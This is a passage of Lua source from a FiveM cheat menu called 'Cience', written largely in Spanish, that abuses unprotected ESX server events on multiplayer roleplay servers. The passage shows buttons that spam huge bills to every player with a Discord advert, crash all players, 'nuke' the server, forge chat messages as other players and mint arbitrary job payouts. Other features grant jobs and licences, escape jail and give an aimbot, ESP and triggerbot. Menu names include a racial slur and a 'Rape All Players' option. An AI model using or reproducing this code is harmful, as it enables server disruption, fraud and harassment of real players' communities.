                        TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "PoLini GanG: https://discord.gg/YB6RnCm", 10000000)
                        TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "PoLini GanG: https://discord.gg/YB6RnCm", 10000000)
                        TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "PoLini GanG: https://discord.gg/YB6RnCm", 10000000)
                        TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "PoLini GanG: https://discord.gg/YB6RnCm", 10000000)
                        TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "PoLini GanG: https://discord.gg/YB6RnCm", 10000000)
                        TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "PoLini GanG: https://discord.gg/YB6RnCm", 10000000)
                        TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "PoLini GanG: https://discord.gg/YB6RnCm", 10000000)
                        TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "PoLini GanG: https://discord.gg/YB6RnCm", 10000000)
                    end
                elseif Cience.Button("Spawn moutain Lion On Everyone(wip)") then
                    for i = 0, 128 do
                        local coords = GetEntityCoords(GetPlayerPed(i))
                        CreatePed(26, GetHashKey("a_c_mtlion"), coords.x, coords.y, coords.z, 0.0, true, true)
                    end
                elseif Cience.Button("Nuke Server") then
                    nukeserver()
                elseif Cience.Button("Rape All Players") then
                    RapeAllFunc()
                elseif Cience.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
                elseif Cience.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
                elseif Cience.CheckBox("Spawn Shit On Everyone", sall, function(enabled) sall = enabled end) then
                elseif Cience.Button("Crash All Players") then
                    for i = 0, 128 do
                        if not ped == GetPlayerPed(-1) then						
                            CrashPlayer(GetPlayerPed(i))
                        end
                    end
                elseif Cience.Button("Fake Message") then
                    local da=KeyboardInput("Enter player name","",100)
                    if da then 
                        local ck=KeyboardInput("Enter message","",1000)
                        if ck then 
                            TriggerServerEvent('_chat:messageEntered',da,{0,0x99,255},ck)
                        end 
                    end 
                elseif Cience.Button("ESX Set All Police") then
                    for i = 0, 128 do 
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), "police", 3)
                        TriggerServerEvent('NB:recruterplayer', i, "police", 3)
                    end 
                elseif Cience.Button("ESX Set All Mechanic") then
                    for i = 0, 128 do 
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), "mecano", 3)
                        TriggerServerEvent('NB:recruterplayer', i, "mecano", 3)
                    end 
                end

                Cience.Display()
            elseif Cience.IsMenuOpened("TeleportMenu") then
                if Cience.Button("Tp a un ~y~punto") then
                    TeleportToWaypoint()
                elseif Cience.Button("Teletransportarse al vehículo más cercano") then
                    teleportToNearestVehicle()
                elseif Cience.Button("Tp a coordenadas") then
                    TeleportToCoords()
                elseif Cience.CheckBox(
                    "Mostrar coordenadas",
                    showCoords,
                    function(enabled)
                        showCoords = enabled
                    end)
                then
                elseif Cience.Button("Poner un blip custom") then
                    bk()
                end

                Cience.Display()
            elseif Cience.IsMenuOpened("VehMenu") then
                if Cience.Button("Reparar vehiculo") then
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                elseif Cience.Button("Comprar vehiculo por la cara") then
                    fv()
                elseif Cience.CheckBox(
                    "Modo Arcoiris",
                    RainbowVeh,
                    function(enabled)
                        RainbowVeh = enabled
                    end)
                then
                    local veh = GetVehiclePedIsUsing(PlayerPedId())
                elseif Cience.CheckBox(
                    "Super Handling",
                    superGrip,
                    function(enabled)
                        superGrip = enabled
                        enchancedGrip = false
                        driftMode = false
                        fdMode = false
                    end)
                then
                elseif Cience.CheckBox(
                    "Enhanced Grip",
                    enchancedGrip,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = enabled
                        driftMode = false
                        fdMode = false
                    end)
                then
                elseif Cience.CheckBox(
                    "Drift Mode",
                    driftMode,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = false
                        driftMode = enabled
                        fdMode = false
                    end)
                then
                elseif Cience.CheckBox(
                    "Formula Drift Mode",
                    fdMode,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = false
                        driftMode = false
                        fdMode = enabled
                    end)
                then
                elseif Cience.CheckBox(
                    'Boost de velocidad ~g~SHIFT ~r~CTRL',
                    VehSpeed,
                    function(dl)
                        VehSpeed = dl
                    end)
                then
                elseif Cience.Button("Eliminar Vehiculo") then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
                elseif Cience.CheckBox(
                    "GOD MODE",
                    VehGod,
                    function(enabled)
                        VehGod = enabled
                    end)
                then
                elseif Cience.Button("FUEL 100%") then
                    local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(-1)))
			        local vehj1ujjjs = GetClosestVehicle(x, y, z, 4.001, 0, 70)
                    TriggerEvent("advancedFuel:setEssence", 100, GetVehicleNumberPlateText(vehj1ujjjs), GetDisplayNameFromVehicleModel(GetEntityModel(vehj1ujjjs)))
                elseif Cience.Button("Spawnear vehiculo") then
                    local ModelName = KeyboardInput("Ingrese el nombre de aparición del vehículo", "", 100)
                    if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                        RequestModel(ModelName)
                        while not HasModelLoaded(ModelName) do
                            Citizen.Wait(0)
                        end

                        local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)
                        if DelCurVeh then
                            DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
                            drawNotification("Vehiculo Eliminado")
                        end
                        if SpawnInVeh then
                            SetPedIntoVehicle(PlayerPedId(), veh, -1)
                        end
                    else
                        drawNotification("~r~Modelo no valido!")
                    end
                end

                Cience.Display()
            elseif Cience.IsMenuOpened("NiggerCustoms") then
                if Cience.CheckBox(
                    "Super Handling",
                    superGrip,
                    function(enabled)
                        superGrip = enabled
                        enchancedGrip = false
                        driftMode = false
                        fdMode = false
                    end)
                then
                elseif Cience.CheckBox(
                    "Agarre mejorado",
                    enchancedGrip,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = enabled
                        driftMode = false
                        fdMode = false
                    end)
                then
                elseif Cience.CheckBox(
                    "Modo drift",
                    driftMode,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = false
                        driftMode = enabled
                        fdMode = false
                    end)
                then
                elseif Cience.CheckBox(
                    "Modo de drift de fórmula",
                    fdMode,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = false
                        driftMode = false
                        fdMode = enabled
                    end)
                then
                elseif Cience.MenuButton("∑Impulso de vehículo", "VehBoostMenu") then
                elseif Cience.MenuButton("∑Performance Tuning", "PerformanceMenu") then
                elseif Cience.Button("Tuneo maximo") then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
                elseif Cience.Button("Rendimiento máximo") then
                    MaxOutPerf(GetVehiclePedIsUsing(PlayerPedId()))
                end

                Cience.Display()
            elseif Cience.IsMenuOpened("VehBoostMenu") then
                if Cience.CheckBox(
                    "Torque Boost 2x",
                    t2x,
                    function(enabled)
                        t2x = enabled
                        t4x = false
                        t8x = false
                        t16x = false
                    end) 
                then
                elseif Cience.CheckBox(
                    "Torque Boost 4x",
                    t4x,
                    function(enabled)
                        t2x = false
                        t4x = enabled
                        t8x = false
                        t16x = false
                    end)
                then
                elseif Cience.CheckBox(
                    "Torque Boost 8x",
                    t8x,
                    function(enabled)
                        t2x = false
                        t4x = false
                        t8x = enabled
                        t16x = false
                    end)
                then
                elseif Cience.CheckBox(
                    "Torque Boost 16x",
                    t16x,
                    function(enabled)
                        t2x = false
                        t4x = false
                        t8x = false
                        t16x = enabled
                    end)
                then
                end

                Cience.Display()
            elseif Cience.IsMenuOpened("PerformanceMenu") then

                Cience.Display()
            elseif Cience.IsMenuOpened("VehSpawnOpt") then
                if Cience.CheckBox(
                    "Eliminar vehículo actual", 
                    DelCurVeh, 
                    function(enabled) 
                        DelCurVeh = enabled 
                    end)
                then 
                elseif Cience.CheckBox(
                    "Spawnear en el vehiculo",
                    SpawnInVeh,
                    function(enabled)
                        SpawnInVeh = enabled
                    end)
                then
                end
            
                Cience.Display()
            elseif Cience.IsMenuOpened("MaliciousMenu") then
                if Cience.CheckBox(
                    "Mirilla 1",
                    crosshair,
                    function(enabled)
                        crosshair = enabled
                    end)
                then
                elseif Cience.CheckBox(
                    "Mirilla 2",
                    crosshair2,
                    function(enabled)
                         crosshair2 = enabled
                    end)
                then
                elseif Cience.CheckBox(
                    "Mirilla 3",
                    crosshair3,
                    function(enabled)
                        crosshair3 = enabled
                    end)
                then    
                elseif Cience.CheckBox(
                '~o~Vision termica',
                thermalVision,
                function(enabled)
                    thermalVision = enabled
                    SetSeethrough(thermalVision)
                end) 
                then 
                elseif Cience.CheckBox(
                    "AimBot",
                    aimbot,
                    function(enabled)
                        aimbot = enabled
                    end)
                then
                elseif Cience.CheckBox(
                    "ESP",
                    esp,
                    function(enabled)
                        esp = enabled
                    end)
                then
                elseif Cience.CheckBox(
                    "Trigger Bot",
                    TriggerBot,
                    function(enabled)
                        TriggerBot = enabled
                    end)
                then
                elseif Cience.CheckBox(
                    "Blips de jugadores",
                    playerBlips,
                    function(enabled)
                        playerBlips = enabled
                    end)
                then
                end

                Cience.Display()
            elseif Cience.IsMenuOpened("ESXMenu") then
                if Cience.MenuButton("∑ESX Opciones de dinero", "ESXMoneyMenu") then
                elseif Cience.MenuButton("∑ESX Trabajo menu", "ESXJobMenu") then
                elseif Cience.MenuButton("∑ESX Boss", "ESXBossMenu") then
                elseif Cience.MenuButton("∑ESX Droga", "ESXDrugMenu") then
                elseif Cience.MenuButton("∑ESX Otros", "ESXMiscMenu") then
                end
                
                Cience.Display()
            elseif Cience.IsMenuOpened("ESXMiscMenu") then
                if Cience.Button("ESX Recolectar kit de reparación") then
                    TriggerServerEvent('esx_mechanicjob:startHarvest')
                elseif Cience.Button("ESX Craftear Kit de reparación") then
                    TriggerServerEvent('esx_mechanicjob:startCraft')
                elseif Cience.Button("ESX License drive") then
                    TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
                end
                
                Cience.Display()
            elseif Cience.IsMenuOpened("ESXDrugMenu") then
                if Cience.Button('Recolectar marihuana (x5)') then 
                    TriggerServerEvent('esx_drugs:startHarvestWeed')
                    TriggerServerEvent('esx_drugs:startHarvestWeed')
                    TriggerServerEvent('esx_drugs:startHarvestWeed')
                    TriggerServerEvent('esx_drugs:startHarvestWeed')
                    TriggerServerEvent('esx_drugs:startHarvestWeed')
                elseif Cience.Button('Transformar marihuana (x5)') then
                    TriggerServerEvent('esx_drugs:startTransformWeed')
                    TriggerServerEvent('esx_drugs:startTransformWeed')
                    TriggerServerEvent('esx_drugs:startTransformWeed')
                    TriggerServerEvent('esx_drugs:startTransformWeed')
                    TriggerServerEvent('esx_drugs:startTransformWeed')
                elseif Cience.Button('Vender Marihuana (x5)') then
                    TriggerServerEvent('esx_drugs:startSellWeed')
                    TriggerServerEvent('esx_drugs:startSellWeed')
                    TriggerServerEvent('esx_drugs:startSellWeed')
                    TriggerServerEvent('esx_drugs:startSellWeed')
                    TriggerServerEvent('esx_drugs:startSellWeed')
                elseif Cience.Button('Recolectar Coca (x5)') then 
                    TriggerServerEvent('esx_drugs:startHarvestCoke')
                    TriggerServerEvent('esx_drugs:startHarvestCoke')
                    TriggerServerEvent('esx_drugs:startHarvestCoke')
                    TriggerServerEvent('esx_drugs:startHarvestCoke')
                    TriggerServerEvent('esx_drugs:startHarvestCoke')
                elseif Cience.Button('Transformar Coca (x5)') then
                    TriggerServerEvent('esx_drugs:startTransformCoke')
                    TriggerServerEvent('esx_drugs:startTransformCoke')
                    TriggerServerEvent('esx_drugs:startTransformCoke')
                    TriggerServerEvent('esx_drugs:startTransformCoke')
                    TriggerServerEvent('esx_drugs:startTransformCoke')
                elseif Cience.Button('Vender Coca (x5)') then
                    TriggerServerEvent('esx_drugs:startSellCoke')
                    TriggerServerEvent('esx_drugs:startSellCoke')
                    TriggerServerEvent('esx_drugs:startSellCoke')
                    TriggerServerEvent('esx_drugs:startSellCoke')
                    TriggerServerEvent('esx_drugs:startSellCoke')
                elseif Cience.Button('Recolectar metanfetamina (x5)') then 
                    TriggerServerEvent('esx_drugs:startHarvestMeth')
                    TriggerServerEvent('esx_drugs:startHarvestMeth')
                    TriggerServerEvent('esx_drugs:startHarvestMeth')
                    TriggerServerEvent('esx_drugs:startHarvestMeth')
                    TriggerServerEvent('esx_drugs:startHarvestMeth')
                elseif Cience.Button('Transformar metanfetamina (x5)') then
                    TriggerServerEvent('esx_drugs:startTransformMeth')
                    TriggerServerEvent('esx_drugs:startTransformMeth')
                    TriggerServerEvent('esx_drugs:startTransformMeth')
                    TriggerServerEvent('esx_drugs:startTransformMeth')
                    TriggerServerEvent('esx_drugs:startTransformMeth')
                elseif Cience.Button('Vender metanfetamina (x5)') then
                    TriggerServerEvent('esx_drugs:startSellMeth')
                    TriggerServerEvent('esx_drugs:startSellMeth')
                    TriggerServerEvent('esx_drugs:startSellMeth')
                    TriggerServerEvent('esx_drugs:startSellMeth')
                    TriggerServerEvent('esx_drugs:startSellMeth')
                elseif Cience.Button('Recolectar Opio (x5)') then
                    TriggerServerEvent('esx_drugs:startHarvestOpium')
                    TriggerServerEvent('esx_drugs:startHarvestOpium')
                    TriggerServerEvent('esx_drugs:startHarvestOpium')
                    TriggerServerEvent('esx_drugs:startHarvestOpium')
                    TriggerServerEvent('esx_drugs:startHarvestOpium')
                elseif Cience.Button('Transformar Opio (x5)') then
                    TriggerServerEvent('esx_drugs:startTransformOpium')
                    TriggerServerEvent('esx_drugs:startTransformOpium')
                    TriggerServerEvent('esx_drugs:startTransformOpium')
                    TriggerServerEvent('esx_drugs:startTransformOpium')
                    TriggerServerEvent('esx_drugs:startTransformOpium')
                elseif Cience.Button('Vender Opio (x5)') then
                    TriggerServerEvent('esx_drugs:startSellOpium')
                    TriggerServerEvent('esx_drugs:startSellOpium')
                    TriggerServerEvent('esx_drugs:startSellOpium')
                    TriggerServerEvent ('esx_drugs:startSellOpium')
                    TriggerServerEvent('esx_drugs:startSellOpium')
                elseif Cience.Button('Lavar dinero (x10)') then
                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
                    TriggerServerEvent('esx_blanchisseur:startWhitening', 1)
                elseif Cience.Button('Parar todas las (Drogas)') then
                    TriggerServerEvent('esx_drugs:stopHarvestCoke')
                    TriggerServerEvent('esx_drugs:stopTransformCoke')
                    TriggerServerEvent('esx_drugs:stopSellCoke')
                    TriggerServerEvent('esx_drugs:stopHarvestMeth')
                    TriggerServerEvent('esx_drugs:stopTransformMeth')
                    TriggerServerEvent('esx_drugs:stopSellMeth')
                    TriggerServerEvent('esx_drugs:stopHarvestWeed')
                    TriggerServerEvent('esx_drugs:stopTransformWeed')
                    TriggerServerEvent('esx_drugs:stopSellWeed')
                    TriggerServerEvent('esx_drugs:stopHarvestOpium')
                    TriggerServerEvent('esx_drugs:stopTransformOpium')
                    TriggerServerEvent('esx_drugs:stopSellOpium')
                elseif Cience.Button('Meta UnicosRP Sell') then
                    TriggerServerEvent('esx_drugs:startSellMeth')
                end


                Cience.Display()
            elseif Cience.IsMenuOpened("ESXBossMenu") then
                if Cience.Button("ESX Mecanico Boss Menu") then
                    TriggerEvent("esx_society:openBossMenu",'mecano',function(dU,dV)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","mecano",function(dU,dV)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu",'mecano',function(dW,dX)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","mecano",function(dW,dX)
                        Cience.close()end)
                    TriggerEvent("esx_society:openBossMenu",'mecano',function(dY,dZ)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","mecano",function(dY,dZ)
                        Cience.close()
                    end)
                    Cience.CloseMenu()
                elseif Cience.Button("ESX Policia Boss Menu") then
                    TriggerEvent("esx_society:openBossMenu",'police',function(dU,dV)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","police",function(dU,dV)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu",'police',function(dW,dX)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","police",function(dW,dX)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu",'police',function(dY,dZ)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","police",function(dY,dZ)
                        Cience.close()
                    end)
                    Cience.CloseMenu()
                elseif Cience.Button("ESX EMS Boss Menu") then
                    TriggerEvent("esx_society:openBossMenu",'ambulance',function(dU,dV)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","ambulance",function(dU,dV)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu",'ambulance',function(dW,dX)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","ambulance",function(dW,dX)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu",'ambulance',function(dY,dZ)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","ambulance",function(dY,dZ)
                        Cience.close()
                    end)
                        Cience.CloseMenu()
                elseif Cience.Button("ESX Taxi Boss Menu") then
                    TriggerEvent("esx_society:openBossMenu",'taxi',function(dU,dV)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","taxi",function(dU,dV)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu",'taxi',function(dW,dX)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","taxi",function(dW,dX)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu",'taxi',function(dY,dZ)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","taxi",function(dY,dZ)
                        Cience.close()
                    end)
                        Cience.CloseMenu()
                elseif Cience.Button("ESX Bienes raíces Boss Menu") then
                    TriggerEvent("esx_society:openBossMenu",'realestateagent',function(dU,dV)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","realestateagent",function(dU,dV)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu",'realestateagent',function(dW,dX)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","realestateagent",function(dW,dX)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu",'realestateagent',function(dY,dZ)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","realestateagent",function(dY,dZ)
                        Cience.close()
                    end)
                        Cience.CloseMenu()
                elseif Cience.Button("ESX Vendedor de autos Boss Menu") then
                    TriggerEvent("esx_society:openBossMenu",'cardealer',function(dU,dV)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","cardealer",function(dU,dV)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu",'cardealer',function(dW,dX)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","cardealer",function(dW,dX)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu",'cardealer',function(dY,dZ)
                        Cience.close()
                    end)
                    TriggerEvent("esx_society:openBossMenu","cardealer",function(dY,dZ)
                        Cience.close()
                    end)
                        Cience.CloseMenu()
                elseif Cience.Button("ESX Custom Boss Menu") then
                    local e=KeyboardInput("Ingrese el nombre del trabajo del menú del jefe personalizado","",100)
                    if e~=""then 
                        TriggerEvent("esx_society:openBossMenu",e,function(dU,dV)
                            Cience.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu",e,function(dW,dX)
                            Cience.close()
                        end)
                        TriggerEvent("esx_society:openBossMenu",e,function(dY,dZ)
                            Cience.close()
                        end)
                        Cience.CloseMenu()
                    end 
                end

                Cience.Display()
            elseif Cience.IsMenuOpened("ESXJobMenu") then
                if Cience.Button("Desempleado") then
                    TriggerServerEvent('NB:destituerplayer',GetPlayerServerId(-1))
                elseif Cience.Button("Policia") then
                    TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"police",3)
                elseif Cience.Button("Mecanico") then
                    TriggerServerEvent('esx_joblisting:setJob',GetPlayerServerId(-1), "mecano",3)
                elseif Cience.Button("Taxi") then
                    TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"taxi",3)
                elseif Cience.Button("EMS") then
                    TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"ambulance",3)
                elseif Cience.Button("Real Estate Agent") then
                    TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"realestateagent",3)
                elseif Cience.Button("Car Dealer") then
                    TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(-1),"cardealer",3)
                end

                Cience.Display()
            elseif Cience.IsMenuOpened("ESXMoneyMenu") then
                if Cience.Button("ESX Trabajo de camionero") then
                    local result = KeyboardInput("Enter amount of money", "", 100000000)
                    if result then
                        TriggerServerEvent('esx_truckerjob:pay', result)
                    end
                elseif Cience.Button("ESX Precaución Devolver") then
                    local result = KeyboardInput("Enter amount of money", "", 100000000)
                    if result then
                        TriggerServerEvent('esx_jobs:caution', 'give_back', result)
                    end
                elseif Cience.Button("ESX GoPostalJob") then
                    local result = KeyboardInput("Enter amount of money", "", 100000000)
                    if result then
                        TriggerServerEvent("esx_gopostaljob:pay", result)
                    end
                elseif Cience.Button("ESX Pizza Job") then
                    local result = KeyboardInput("Enter amount of money", "", 100000000)
                    if result then
                        TriggerServerEvent("esx_pizza:pay", result)
                    end
                elseif Cience.Button("ESX ZonaAmericana Pizza Job") then
                    local paie = KeyboardInput("Enter amount of money", "", 100000000)
                    if paie then
                        TriggerServerEvent('75443bd4-5b51-4086-a9fa-55e5eba6368b', paie)
                    end 
                elseif Cience.Button("ESX Airlines") then
                    local result = KeyboardInput("Enter amount of money", "", 100000000)
                    if result then
                        TriggerServerEvent("esx_airlines:pay", result)
                    end
                elseif Cience.Button("ESX BankerJob") then
                    local result = KeyboardInput("Enter amount of money", "", 100000000)
                    if result then
                        TriggerServerEvent("esx_banksecurity:pay", result)
                    end
                end
            
                Cience.Display()
            elseif Cience.IsMenuOpened("SelfMenu") then
                if Cience.Button("~g~Heal") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif Cience.Button("Darte ~b~armadura") then
                    SetPedArmour(PlayerPedId(), 200)
                elseif Cience.Button("Abrir skin menu") then
                    TriggerEvent('esx_skin:openSaveableMenu')
                    setMenuVisible(currentMenu, false)
                elseif Cience.Button("ESX Añadir ~y~hambre~w~/~b~agua ~w~a 100%") then
                    TriggerEvent('esx_status:set', 'hunger', 1000000)
                    TriggerEvent('esx_status:set', 'thirst', 1000000)
                elseif Cience.Button("ESX ~g~Revivirte") then
                    TriggerEvent("esx_ambulancejob:revive")
                elseif Cience.Button("ESX Salir de la ~r~carcel") then
                    local ped = PlayerPedId(-1)
                    TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
                    TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
                    TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(ped),0)
                    TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
                elseif Cience.Button("~r~Suicidarte") then
                    SetEntityHealth(PlayerPedId(), 0)
                elseif  Cience.CheckBox(
                    "~g~God Mode",
                    GodMode,
                    function(enabled)
                    GodMode = enabled
                    end) 
                then
                elseif Cience.CheckBox(
                    "~y~Stamina infinita",
                    infStamina,
                    function(enabled)
                    infStamina = enabled
                    end)
                then
                elseif Cience.CheckBox(
                    "Modo ~y~Flash",
                    fastrun,
                    function(enabled)
                        fastrun = enabled
                    end)
                then
                elseif Cience.CheckBox(
                    "~b~Super salto",
                    SuperJump,
                    function(enabled)
                        SuperJump = enabled
                    end)
                then
                elseif Cience.CheckBox(
                    "~y~Noclip",
                    Noclip,
                    function(enabled)
                        Noclip = enabled
                    end)
                then
                elseif Cience.CheckBox(
                    "~b~Invisible ;)",
                    invisible,
                    function(enabled)
                        invisible = enabled
                    end)
                then
                end

                Cience.Display()
            elseif Cience.IsMenuOpened("MODEL") then
                if Cience.Button("~b~~h~Payaso") then
                    local model = "s_m_y_clown_01"
                        RequestModel(GetHashKey(model)) 
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                    elseif Cience.Button("~b~~h~Stripper") then
                    local model = "s_f_y_stripper_01"
                        RequestModel(GetHashKey(model)) 
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif Cience.Button("~b~~h~Policia") then
                    local model = "s_m_y_cop_01"
                        RequestModel(GetHashKey(model)) 
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif Cience.Button("~b~~h~Mono") then
                    local model = "a_c_chimp"
                        RequestModel(GetHashKey(model)) 
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif Cience.Button("~b~~h~Alien") then
                    local model = "s_m_m_movalien_01"
                        RequestModel(GetHashKey(model)) 
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif Cience.Button("~b~~h~Pongo") then
                    local model = "u_m_y_pogo_01"
                        RequestModel(GetHashKey(model)) 
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif Cience.Button("~b~~h~Babyd") then
                    local model = "u_m_y_babyd"
                        RequestModel(GetHashKey(model)) 
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                            end
                            elseif Cience.Button("~b~~h~Fivem") then
                    local model = "mp_m_freemode_01"
                        RequestModel(GetHashKey(model)) 
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                        else ShowInfo("~r~Modelo no reconocido") end
                    elseif Cience.Button("~r~~h~Ropa aleatoria") then
                        SetPedRandomComponentVariation(PlayerPedId(), true)
                    elseif Cience.Button("~r~~h~Ropa a seleccion") then
                        local model = KeyboardInput("Enter custom clothes", "", 1000000)
                        RequestModel(GetHashKey(model)) 
                        Wait(500)
                        if HasModelLoaded(GetHashKey(model)) then
                            SetPlayerModel(PlayerId(), GetHashKey(model))
                        else
                            drawNotification("Modelo no encontrado.")
                        end
                    end

                Cience.Display()
            elseif Cience.IsMenuOpened("TM1") then
                if Cience.Button("~g~Licencia de armas UNIVERSITY") then
                    TriggerEvent('pop_university:setWeaponLicense')
                elseif Cience.Button("Licencia de ~g~Plantar") then
                    TriggerServerEvent('pop_university:setKown')
                    drawNotification("~b~Licencia adquirida")
                elseif Cience.Button("Licencia de ~b~Recojer") then
                    TriggerServerEvent('pop_university:setCatch')
                    drawNotification("~b~Licencia adquirida")
                elseif Cience.Button("Licencia de ~y~Hombre de negocios") then
                    TriggerServerEvent('pop_university:setBussinesMan')
                    drawNotification("~b~Licencia adquirida")
                elseif Cience.Button("Licencia de ~p~Don de palabra") then
                    TriggerEvent('pop_university:donDePalabra')
                    drawNotification("~b~Licencia adquirida")
                elseif Cience.Button("Darte ~b~nevaditos ~y~cantidad a elejir") then
                    local custom = KeyboardInput("Enter custom quantity", "", 100000)
                    TriggerServerEvent('tm1_mafias:addItem','nevadito',custom)
                    drawNotification("~g~Te has dado 100 nevaditos")
                elseif Cience.Button("Vender ~b~Nevaditos") then
                    TriggerServerEvent('tm1_mafias:sellWeedCoke')
                    drawNotification("~b~Has vendido tus nevaditos")
                elseif Cience.Button("Dar todas las ~y~licencias ~w~a todos.") then
                    TriggerEvent('pop_university:setWeaponLicense', -1)
                    TriggerServerEvent('pop_university:setKown', -1)
                    TriggerServerEvent('pop_university:setCatch', -1)
                    TriggerServerEvent('pop_university:setBussinesMan', -1)
                    TriggerEvent('pop_university:donDePalabra', -1)
                    drawNotification("~y~Has dado a todo el mundo las licencias")
                elseif Cience.Button("Darte ~y~x1000 ~w~de ~p~experiencia") then
                    TriggerServerEvent('exp:addExperience',1000)
                elseif Cience.Button("Ponerte desempleado") then
                    TriggerServerEvent('esx_joblisting:setJob', "unemployed")
                elseif Cience.Button("Party ~b~COMISARIA!!!") then                  
                    spawn_vehicle('cargoplane',441.1, -993.23, 30.69)
                    spawn_vehicle('cargoplane',444.1, -992.23, 30.69)
